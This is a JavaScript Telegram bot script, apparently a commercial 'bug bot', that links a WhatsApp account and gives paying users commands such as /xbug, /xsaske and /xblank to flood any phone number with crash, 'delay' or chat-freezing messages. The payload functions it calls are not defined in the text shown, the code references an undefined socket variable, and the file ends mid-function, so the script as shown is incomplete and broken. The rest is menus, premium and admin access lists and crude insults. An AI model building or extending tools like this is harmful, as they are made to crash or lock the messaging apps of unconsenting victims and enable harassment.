/*

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

🩸  СКРИПТ : 𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐕𝐈𝐍𝐈𝐓𝐘 VVIP
🩸  ВЕРСИЯ : 5.0
🩸  РАЗРАБОТЧИК : @SASUKEXDEV

🌫️ Рождён в тумане холода...
🌑 Нашептан мраком ночи...
🕯️ И подчиняется лишь своему хозяину...

⚠️ Не трогай... если не готов принять проклятие.

📌 Telegram : https://t.me/SASUKEXDEV 

💀 Благодарности:
- Pencipta 
- MY SUPPORT 
- MY TEACHER 
- ALL BUYER 
- DEVELOPER SCRIPT 𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐕𝐈𝐍𝐈𝐓𝐘
- HATTERS
- MY FAMILYY
- Верные пользователи

© 𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐕𝐈𝐍𝐈𝐓𝐘 – Все права поглощены тьмой

▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓

*/


const { Telegraf, Markup, session } = require("telegraf");
const fs = require('fs');
const moment = require('moment-timezone');
const {
makeWASocket,
makeInMemoryStore,
fetchLatestBaileysVersion,
useMultiFileAuthState,
DisconnectReason,
generateWAMessageFromContent,
generateMessageID,
proto
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const crypto = require('crypto');
const axios = require("axios");
const { spawn } = require("child_process");
const { tmpdir } = require("os");
const { join } = require("path");
const { BOT_TOKEN } = require("./system/config");
const premiumFile = './system/database/premiumuser.json';
const ownerFile = './system/database/owneruser.json';
const adminFile = './system/database/adminuser.json';
const groupOnlyFile = './system/database/grouponly.json';
const cooldownUsers = new Map();

let bots = [];
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());
let xerxes = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6", "7", "82"];

const randomImages = [
"https://files.catbox.moe/fa01a7.jpg",
"https://files.catbox.moe/fa01a7.jpg",
"https://files.catbox.moe/fa01a7.jpg",
"https://files.catbox.moe/fa01a7.jpg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  
  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
  const rl = require('readline').createInterface({
    input: process.stdin,
    output: process.stdout
  });
  rl.question(query, (answer) => {
    rl.close();
    resolve(answer);
  });
});
// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();
  
  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }), // Log level diubah ke "info"
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'P', // Placeholder, you can change this or remove it
    }),
  };
  
  xerxes = makeWASocket(connectionOptions);
  
  xerxes.ev.on('creds.update', saveCreds);
  store.bind(xerxes.ev);
  
  xerxes.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'open') {
      xerxes.newsletterFollow("120363404376839188@newsletter")
      isWhatsAppConnected = true;
      console.log(chalk.red.bold(`╭─────────────────────────────╮
│ ${chalk.white('Whatsapp Connection')}
╰─────────────────────────────╯`));
  }
  
  if (connection === 'close') {
    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
    console.log(
    chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white.bold('Whatsapp Disconnected')}
╰─────────────────────────────╯`),
  shouldReconnect ? chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white.bold('Reconnecting Again')}
╰─────────────────────────────╯`) : ''
);
if (shouldReconnect) {
  startSesi();
}
isWhatsAppConnected = false;
}
});
}


const loadJSON = (file) => {
if (!fs.existsSync(file)) return [];
return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
if (!ownerUsers.includes(ctx.from.id.toString())) {
return ctx.reply("❌ [ Akses Di Tolak ] Bukan Developer Gausah Mainin");
}
next();
};

const checkAdmin = (ctx, next) => {
if (!adminUsers.includes(ctx.from.id.toString())) {
return ctx.reply("❌ [ Akses Di Tolak ] Lu Bukan Admin Tolol Buy Akses Ke @SASUKEXDEV");
}
next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
if (!premiumUsers.includes(ctx.from.id.toString())) {
return ctx.reply("❌ [ Akses Di Tolak ] Gausah Di Mainin Khusus Premium Anjj Buy Akses Ke @SASUKEXDEV");
}
next();
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
if (!adminList.includes(userId)) {
adminList.push(userId);
saveAdmins();
}
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
adminList = adminList.filter(id => id !== userId);
saveAdmins();
};


// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
try {
const data = fs.readFileSync('./admins.json');
adminList = JSON.parse(data);
} catch (error) {
console.error(chalk.red('Gagal memuat daftar admin:'), error);
adminList = [];
}
};

// Membaca status grup-only dari file (aktif/tidak)
let groupOnlyStatus = fs.existsSync(groupOnlyFile) ? JSON.parse(fs.readFileSync(groupOnlyFile)) : { enabled: false };

// Fungsi untuk menyimpan status mode grup ke file
function saveGroupOnly() {
fs.writeFileSync(groupOnlyFile, JSON.stringify(groupOnlyStatus, null, 2));
}

// --- Contoh Command dan Middleware ---
const prosesrespone = async (target, ctx) => {
  
    const ProsesColi = `\`\`\`\n
┏───⦗ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ⦘────╮
│ STATUS : PROCESSING SENDING BUG. . .
│ NOTE : JEDA 5 MENIT
│ BIAR GA KENON
╰────────────────────╯\`\`\`   `;

    await ctx.replyWithPhoto("https://files.catbox.moe/fa01a7.jpg", {
      caption: ProsesColi,
      parse_mode: "Markdown"
    })
};

const donerespone = async (target, ctx) => {
  
    const SuksesCrot = `\`\`\`\n
╭───⦗ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ⦘────╮
│ STATUS : SUCCESFULLY SENDING BUG. . .
│ NOTE : JEDA 5 MENIT 
│ BIAR GA KENON
╰────────────────────╯
╭────────────────────╮
│🌀 𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐕𝐈𝐍𝐈𝐓𝐘 🌀
╰────────────────────╯\`\`\`
    `;

    await ctx.replyWithPhoto("https://files.catbox.moe/fa01a7.jpg", {
      caption: SuksesCrot,
      parse_mode: "Markdown"
    })
};

// Middleware untuk mengecek apakah bot hanya berjalan di grup/pribadi
const checkGroupOnly = (ctx, next) => {
const isGroup = ctx.chat.type.endsWith('group');

if (groupOnlyStatus.enabled && !isGroup) {
return ctx.reply("Group only kontol", { parse_mode: "Markdown" });
}
if (!groupOnlyStatus.enabled && isGroup) {
return ctx.reply("Private only kontol", { parse_mode: "Markdown" });
}

next();
};
// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
premiumUsers[userId] = {
expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
};
savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
delete premiumUsers[userId];
savePremiumUsers();
};
// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
const userData = premiumUsers[userId];
if (!userData) {
Premiumataubukan = "❌";
return false;
}

const now = moment().tz('Asia/Jakarta');
const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

if (now.isBefore(expirationDate)) {
Premiumataubukan = "✅";
return true;
} else {
Premiumataubukan = "❌";
return false;
}
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
try {
const data = fs.readFileSync('./premiumUsers.json');
premiumUsers = JSON.parse(data);
} catch (error) {
console.error(chalk.red('Gagal memuat data user premium:'), error);
premiumUsers = {};
}
};

const checkWhatsAppConnection = (ctx, next) => {
if (!isWhatsAppConnected) {
ctx.reply(`
╭⧽『 𝐄𝐑𝐑𝐎𝐑 』
│▢ Belum Terhubung, Bung.
│▢ Sistem menolak akses lu.
╰──────────────────╯

╭⧽『 𝐂𝐀𝐓𝐀𝐓𝐀𝐍 』
│▢ Gunakan perintah /addbot
│▢ Untuk mengakses fitur bug.
╰──────────────────╯
`);
return;
}
next();
};

async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomImage(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}


//~~~~~~~~~~~~𝙎𝙏𝘼𝙍𝙏~~~~~~~~~~~~~\\
bot.command('start', checkGroupOnly, async (ctx) => {
  const userId = ctx.from.id.toString();

  if (blacklist.includes(userId)) {
    return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
  }

  const RandomBgtJir = getRandomImage();
  const waktuRunPanel = getUptime(); // Uptime panel
  const senderId = ctx.from.id;
  const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
  const id = ctx.from.id;
  const senderName = ctx.from.first_name ? `User: ${ctx.from.first_name}` : `User ID: ${senderId}`;

  await ctx.replyWithPhoto(RandomBgtJir, {
    caption: `\`\`\`
☰ Olaa ${senderName} こんにちは です。開発者 @SASUKEXDEV によって作成されました。ボットを賢く使用してください。

—#  I N F O U S E R S ⌯
──────────────────
▢ Username : ${username}
▢ ID : ${id}
▢ TIME : ${waktuRunPanel}
──────────────────
—# I N F O B O T ⌯
▢ Script Name : 𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐕𝐈𝐍𝐈𝐓𝐘 Vvip
▢ Version : 5.0 — VVIP
▢ Developer : @SASUKEXDEV
▢ Chanell  : @sasukeXteam
──────────────────
 ᴘɪʟɪʜ ᴍᴇɴᴜ ᴅɪʙᴀᴡᴀʜ ɪɴɪ.
\`\`\`
`,
    parse_mode: 'Markdown',
     ...Markup.inlineKeyboard([
      [
        Markup.button.callback('[ 𝐁𝐔𝐆𝐒 ]', 'bugmenu' ),
        Markup.button.callback('[ 𝐒𝐄𝐓𝐈𝐍𝐆 ]', 'ownermenu' ),
      ],
      [
        Markup.button.callback('[ 𝐓𝐎𝐎𝐋𝐒 ]', 'toolsmenu' ),
        Markup.button.callback("[ 𝐓𝐐𝐓𝐎 ]", "tqto" ),
      ]
    ])
  });
});

bot.action('bugmenu', checkGroupOnly, async (ctx) => {
  const userId = ctx.from.id.toString();
  const senderName = ctx.from.first_name || 'User';
  const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
  const id = ctx.from.id;
  const waktuRunPanel = getUptime();

  if (blacklist.includes(userId)) {
    return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
  }

  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 BACK MENU', 'startback' )],
  ]);

  const caption = `\`\`\`
☰ Olaa ${senderName} こんにちはです。開発者 @SASUKEXDEV によって作成されました。ボットを賢く使用してください。

—#  I N F O U S E R S ⌯
──────────────────
▢ Username : ${username}
▢ ID : ${id}
▢ TIME : ${waktuRunPanel}
──────────────────
—# I N F O B O T ⌯
▢ Script Name : 𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐕𝐈𝐍𝐈𝐓𝐘 Vvip
▢ Version : 5.0 — VVIP
▢ Developer : @SASUKEXDEV
▢ Channel : @sasukeXteam
──────────────────
—# B U G M E N U ⌯
▢ /xbug 𝟼𝟸𝚡𝚡
|[ Delay ]|

▢ /xspam 𝟼𝟸𝚡𝚡
|[ Delay ]|

▢ /xsaske 𝟼𝟸𝚡𝚡
|[ DELAY INVIS BULDO ]|

▢ /xblank 𝟼𝟸𝚡𝚡
|[ Blank ]|

▢ /testfunction 62xx
|[ tes function ]|
──────────────────
\`\`\``;

  await editMenu(ctx, caption, buttons, {
    parse_mode: 'Markdown',
    disable_web_page_preview: true
  });
});

bot.action('ownermenu', checkGroupOnly, async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
 const id = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 BACK MENU', 'startback' )],
  ]);

  const caption = `\`\`\`
( 🌀 ) Olaa 👋 ${senderName} こんにちはです。開発者 @SASUKEXDEV によって作成されました。ボットを賢く使用してください。

—# I N F O U S E R S ⌯
│▢ Username : ${username}
│▢ ID : ${id}
│▢ TIME : ${waktuRunPanel}
──────────────────
—# I N F O B O T ⌯
│▢ Script Name : 𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐕𝐈𝐍𝐈𝐓𝐘 Vvip
│▢ Version : 5.0 — VVIP
│▢ Developer : @SASUKEXDEV
│▢ Channel : @sasukeXteam
──────────────────
—# S E T T I N G S ⌯
│▢ /addbot 
│▢ /addadmin 
│▢ /deladmin 
│▢ /addprem 
│▢ /delprem 
│▢ /addowner 
│▢ /delowner
│▢ /listowner 
│▢ /listadmin 
│▢ /listprem
──────────────────
\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action('toolsmenu', checkGroupOnly, async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
 const id = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 BACK MENU', 'startback' )],
  ]);

  const caption = `\`\`\`
☰ Olaa ${senderName} こんにちはです。開発者 @SASUKEXDEV によって作成されました。ボットを賢く使用してください。

—#  I N F O U S E R S ⌯
──────────────────
▢ Username : ${username}
▢ ID : ${id}
▢ TIME : ${waktuRunPanel}
──────────────────
—# I N F O B O T ⌯
▢ Script Name : 𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐕𝐈𝐍𝐈𝐓𝐘 Vvip
▢ Version : 5.0 — VVIP
▢ Developer : @SASUKEXDEV
▢ Channel : @sasukeXteam
──────────────────
—# T O O L S ⌯
▢ /cekid
▢ /delsesi
▢ /grouponly on/off
▢ /cuaca 
▢ /speed
▢ /gaymeter
▢ /sadboy
▢ /bucin
▢ /rasukbot
▢ /hentai
▢ /iq
──────────────────
\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action('tqto', checkGroupOnly, async (ctx) => {
 const userId = ctx.from.id.toString();
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
 const id = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 BACK MENU', 'startback' )],
  ]);

  const caption = `\`\`\`
☰ Olaa ${senderName} こんにちは です。開発者 @SASUKEXDEV によって作成されました。ボットを賢く使用してください。

—#  I N F O U S E R S ⌯
──────────────────
▢ Username : ${username}
▢ ID : ${id}
▢ TIME : ${waktuRunPanel}
──────────────────
—# I N F O B O T ⌯
▢ Script Name : 𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐕𝐈𝐍𝐈𝐓𝐘 Vvip
▢ Version : 5.0 — VVIP
▢ Developer : @SASUKEXDEV
▢ Channel : @sasukeXteam
──────────────────
—# C R E D I T S ⌯
┏━⪨「  𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐕𝐈𝐍𝐈𝐓𝐘 」
┃𖥂 @SASUKEXDEV [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]
┃𖥂 @Putra9910 [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]
┃𖥂 @MakluBapaklu [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]
┃𖥂 @jokkass [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]
┃𖥂 @dyyganteng123 [ best ꜰʀɪᴇɴᴅ ]
┃𖥂 @Razorr969xd [ best ꜰʀɪᴇɴᴅ ]
┃𖥂 @I_WILL_PUNISH [ best ꜰʀɪᴇɴᴅ ]
┃𖥂 @XxXcrotx [ best ꜰʀɪᴇɴᴅ ]
┃𖥂 @ardanFnaf [ best ꜰʀɪᴇɴᴅ ]
┃𖥂 @Aryaajalahh [ best ꜰʀɪᴇɴᴅ ]
┃𖥂 @cibyyluvv [ best ꜰʀɪᴇɴᴅ ]
┃𖥂 @makluampaszz [ best ꜰʀɪᴇɴᴅ ]
┃𖥂 ᴍʏ ɢᴏᴅ [ ᴀʟʟᴀʜ ]
┃𖥂 ᴍʏ ᴘᴀʀᴇɴᴛ [ ayahanda & ibunda ]
┃𖥂 all buyer X strom 
┗━━━━━━━━━━━━━━▣
𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐕𝐈𝐍𝐈𝐓𝐘
──────────────────
\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk BugMenu
bot.action('startback', checkGroupOnly, async (ctx) => {
 const userId = ctx.from.id.toString();
 
 if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
 const waktuRunPanel = getUptime(); // Waktu uptime panel
 const senderId = ctx.from.id;
 const username = ctx.from.username ? `@${ctx.from.username}` : 'Tidak tersedia';
 const id = ctx.from.id;
 const senderName = ctx.from.first_name
    ? `User: ${ctx.from.first_name}`
    : `User ID: ${senderId}`;
    
  const buttons = Markup.inlineKeyboard([
         [
             Markup.button.callback('[ 𝐁𝐔𝐆𝐒 ]', 'bugmenu' ),
             Markup.button.callback('[ 𝐒𝐄𝐓𝐈𝐍𝐆 ]', 'ownermenu' ),
         ],
         [
             
             Markup.button.callback('[ 𝐓𝐎𝐎𝐋𝐒 ]', 'toolsmenu' ),
             Markup.button.callback('[ 𝐓𝐐𝐓𝐎 ]', 'tqto' ),
         ]
]);

  const caption = `\`\`\`
☰ Olaa ${senderName} こんにちはです。開発者 @SASUKEXDEV によって作成されました。ボットを賢く使用してください。

—#  I N F O U S E R S ⌯
──────────────────
▢ Username : ${username}
▢ ID : ${id}
▢ TIME : ${waktuRunPanel}
──────────────────
—# I N F O B O T ⌯
▢ Script Name : 𝐗 𝐒𝐓𝐑𝐎𝐌 𝐈𝐍𝐕𝐈𝐍𝐈𝐓𝐘 Vvip
▢ Version : 5.0 — VVIP
▢ Developer : @SASUKEXDEV
▢ Channel : @sasukXteam
──────────────────
\`\`\``;

  await editMenu(ctx, caption, buttons);
});

//~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~//
bot.command("xspam", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    
    if (!q) {
        return ctx.reply(`Example:\n\n/xspam 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 2; i++) {
    await sangek(sock, target);
    }

   await donerespone(target, ctx);
});

bot.command("xbug", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    
    if (!q) {
        return ctx.reply(`Example:\n\n/xbug 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 2; i++) {
    await maling(sock, target);
    }

   await donerespone(target, ctx);
});
bot.command("xsaske", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    
    if (!q) {
        return ctx.reply(`Example:\n\n/xsaske 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 10; i++) {
    await ngelayyy(sock, target);
    await dileycok(sock, target);
    await begal(sock, target);
    await ngaceng(sock, target);
    }

   await donerespone(target, ctx);
});
bot.command("xblank", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
    
    if (!q) {
        return ctx.reply(`Example:\n\n/xblank 628xxxx`);
    }

    let aiiNumber = q.replace(/[^0-9]/g, '');

    let target = aiiNumber + "@s.whatsapp.net";

    await prosesrespone(target, ctx);

    for (let i = 0; i < 11; i++) {
    await FrezeeChat(sock, target);
    }

   await donerespone(target, ctx);
});
//~~~~~~~~~~~~~~~~~~~~~~END CASE BUG~~~~~~~~~~~~~~~~~~~\\
// ====== Helper Function ======
const formatList = (arr, title) =>
  arr.length
    ? `📋 *Daftar ${title}:*\n` + arr.map((id, i) => `${i + 1}. \`${id}\``).join("\n")
    : `📛 Tidak ada ${title.toLowerCase()} yang terdaftar.`;

// ====== Add Premium ======
bot.command('addprem', checkGroupOnly, checkAdmin, (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = args[1];

  if (!userId) return ctx.reply("❌ Masukkan ID pengguna.\nContoh: /addprem 123456789");

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`⚠️ User ID ${userId} sudah berstatus Premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `🎉 Akses Premium berhasil diberikan!\n` +
    `🧑‍💻 User ID: ${userId}\n` +
    `🚀 Sekarang memiliki akses penuh fitur eksklusif.`
  );
});

// ====== Delete Premium ======
bot.command('delprem', checkGroupOnly, checkAdmin, (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = args[1];

  if (!userId) return ctx.reply("❌ Masukkan ID pengguna.\nContoh: /delprem 123456789");

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`⚠️ User ID ${userId} tidak ditemukan dalam daftar Premium.`);
  }

  premiumUsers = premiumUsers.filter(id => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `🚫 Akses Premium dicabut!\n` +
    `🧑‍💻 User ID: ${userId}\n` +
    `❌ Telah dihapus dari daftar Premium.`
  );
});

// ====== Add Owner ======
bot.command('addowner', checkGroupOnly, checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = args[1];

  if (!userId) return ctx.reply("❌ Masukkan ID user.\nContoh: /addowner 123456789");

  if (ownerUsers.includes(userId)) {
    return ctx.reply(`⚠️ User ID ${userId} sudah terdaftar sebagai Owner.`);
  }

  ownerUsers.push(userId);
  saveJSON(ownerFile, ownerUsers);

  return ctx.reply(
    `👑 Akses Owner diberikan!\n` +
    `🧑‍💻 User ID: ${userId}\n` +
    `🔐 Sekarang memiliki contorol penuh terhadap bot.`
  );
});

// ====== Delete Owner ======
bot.command('delowner', checkGroupOnly, checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = args[1];

  if (!userId) return ctx.reply("❌ Masukkan ID user.\nContoh: /delowner 123456789");

  if (!ownerUsers.includes(userId)) {
    return ctx.reply(`⚠️ User ID ${userId} tidak ditemukan dalam daftar Owner.`);
  }

  if (ctx.from.id.toString() === userId) {
    return ctx.reply("⚠️ Kamu tidak bisa menghapus dirimu sendiri dari daftar Owner.");
  }

  ownerUsers = ownerUsers.filter(id => id !== userId);
  saveJSON(ownerFile, ownerUsers);

  return ctx.reply(
    `🗑️ Akses Owner dicabut!\n` +
    `🧑‍💻 User ID: ${userId}\n` +
    `🚫 Telah dihapus dari daftar Owner.`
  );
});

// ====== Add Admin ======
bot.command('addadmin', checkGroupOnly, checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = args[1];

  if (!userId) return ctx.reply("❌ Masukkan ID pengguna.\nContoh: /addadmin 123456789");

  if (adminUsers.includes(userId)) {
    return ctx.reply(`⚠️ User ID ${userId} sudah menjadi Admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(
    `🔥 Akses Admin diberikan!\n` +
    `🧑‍💻 User ID: ${userId}\n` +
    `⚙️ Sekarang memiliki hak control admin bot.`
  );
});

// ====== Delete Admin ======
bot.command('deladmin', checkGroupOnly, checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  const userId = args[1];

  if (!userId) return ctx.reply("❌ Masukkan ID pengguna.\nContoh: /deladmin 123456789");

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`⚠️ User ID ${userId} tidak ditemukan dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter(id => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(
    `🗑️ Akses Admin dicabut!\n` +
    `🧑‍💻 User ID: ${userId}\n` +
    `🚫 Telah dihapus dari daftar Admin.`
  );
});

// ====== List Commands ======
bot.command('listprem', checkGroupOnly, checkOwner, (ctx) => {
  ctx.replyWithMarkdown(formatList(premiumUsers, "Premium"));
});

bot.command('listadmin', checkGroupOnly, checkOwner, (ctx) => {
  ctx.replyWithMarkdown(formatList(adminUsers, "Admin"));
});

bot.command('listowner', checkGroupOnly, checkOwner, (ctx) => {
  ctx.replyWithMarkdown(formatList(ownerUsers, "Owner"));
});


// 🧾 INFO COMMANDS
// Fungsi escape karakter khusus MarkdownV2
function escapeMarkdown(text) {
return text
.replace(/_/g, "\\_")
.replace(/\*/g, "\\*")
.replace(/\[/g, "\\[")
.replace(/`/g, "\\`")
.replace(/\(/g, "\\(")
.replace(/\)/g, "\\)")
.replace(/~/g, "\\~")
.replace(/>/g, "\\>")
.replace(/#/g, "\\#")
.replace(/\+/g, "\\+")
.replace(/-/g, "\\-")
.replace(/=/g, "\\=")
.replace(/\|/g, "\\|")
.replace(/\{/g, "\\{")
.replace(/\}/g, "\\}")
.replace(/\./g, "\\.")
.replace(/!/g, "\\!");
}

bot.command("cekid", async (ctx) => {
try {
const args = ctx.message.text.split(" ");
const target = args[1];
let user;

if (ctx.message.reply_to_message) {
user = ctx.message.reply_to_message.from;
} else if (target && target.startsWith("@")) {
user = await ctx.telegram.getChat(target);
} else {
user = ctx.from;
}

const name = `${user.first_name || ""} ${user.last_name || ""}`.trim();
const username = user.username ? `@${user.username}` : "-";
const userId = user.id;
const tanggal = moment().format("YYYY-MM-DD");

const text = `*╭━⧽『 INFO DATA USERS 』*
│👤 *Nama* : ${escapeMarkdown(name || "-")}
│🆔 *User ID* : \`${userId}\`
│🌐 *Username* : ${escapeMarkdown(username)}
│📅 *Tanggal* : ${escapeMarkdown(tanggal)}
*╰────────────╯*
_Beli Script Langsung Ke Bawah_`;

const buttons = [];

if (user.username) {
buttons.push([
Markup.button.url("Click Here", `https://t.me/SASUKEXDEV`)
]);
}

await ctx.reply(text, {
parse_mode: "MarkdownV2",
reply_markup: {
inline_keyboard: buttons
}
});

} catch (e) {
console.error(e);
return ctx.reply("❌ Tidak bisa mengambil data. Pastikan username atau target valid dan sudah pernah chat dengan bot.");
}
});

bot.command("grouponly", checkAdmin, checkGroupOnly, async (ctx) => {
const arg = ctx.message.text.split(" ")[1];
if (!arg || !["on", "off"].includes(arg)) {
return ctx.reply("Example:\n:/grouponly on\n/grouponly off");
}

groupOnlyStatus.enabled = arg === "on";
saveGroupOnly();

return ctx.reply(`grouponly mode now *${groupOnlyStatus.enabled ? "active group only" : "inactive private only"}*`, { parse_mode: "Markdown" });
});

bot.command("delsesi", checkGroupOnly, checkOwner, checkAdmin, async (ctx) => {

try {
await fs.promises.rm('./session', { recursive: true, force: true });
WhatsAppConnected = false;
await ctx.reply('✅ Session Berhasil dihapus!');
